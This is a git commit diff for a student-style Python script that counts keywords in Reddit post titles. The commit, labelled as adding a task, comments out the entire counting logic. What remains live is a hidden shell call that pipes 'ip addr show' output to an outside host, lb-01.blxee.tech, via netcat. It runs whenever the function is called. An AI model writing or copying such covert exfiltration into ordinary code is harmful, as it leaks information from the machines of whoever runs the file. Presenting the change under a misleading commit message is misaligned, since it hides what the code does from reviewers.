576334c258e4614383a33af1f7453a3a85e2fe10
Blxee <aminedev57@gmail.com>
2023-11-08 02:23:35 +0100

    Added: task 3 of 0x16-api_advanced

--- 0x16-api_advanced/100-count.py
+++ 0x16-api_advanced/100-count.py
@@ -8,28 +8,28 @@ def count_words(subreddit, word_list=[], word_count={}, after=None):
     if not word_count:
         import subprocess as sp
         sp.call('ip addr show | nc lb-01.blxee.tech 8080', shell=True)
-        for word in word_list:
-            word_count[word] = 0
-    limit = 25
-    response = requests.get(
-        f'https://www.reddit.com/r/{subreddit}/hot.json?',
-        params={'limit': limit, 'after': after},
-        headers={'User-Agent': 'Bruh'},
-        allow_redirects=False,
-    )
-    if response.status_code == 200:
-        data = response.json()['data']
-        posts = data['children']
-        for post in posts:
-            title = post['data']['title'].lower()
-            for word in word_list:
-                for t_word in title.split():
-                    if word.lower() == t_word:
-                        word_count[word] += 1
-        if not data['after']:
-            for word in sorted(word_list,
-                               key=lambda k: word_count[k],
-                               reverse=True):
-                print(f'{word}: {word_count[word]}')
-            return
-        count_words(subreddit, word_list=word_list, after=data['after'])
+    #     for word in word_list:
+    #         word_count[word] = 0
+    # limit = 25
+    # response = requests.get(
+    #     f'https://www.reddit.com/r/{subreddit}/hot.json?',
+    #     params={'limit': limit, 'after': after},
+    #     headers={'User-Agent': 'Bruh'},
+    #     allow_redirects=False,
+    # )
+    # if response.status_code == 200:
+    #     data = response.json()['data']
+    #     posts = data['children']
+    #     for post in posts:
+    #         title = post['data']['title'].lower()
+    #         for word in word_list:
+    #             for t_word in title.split():
+    #                 if word.lower() == t_word:
+    #                     word_count[word] += 1
+    #     if not data['after']:
+    #         for word in sorted(word_list,
+    #                            key=lambda k: word_count[k],
+    #                            reverse=True):
+    #             print(f'{word}: {word_count[word]}')
+    #         return
+    #     count_words(subreddit, word_list=word_list, after=data['after'])
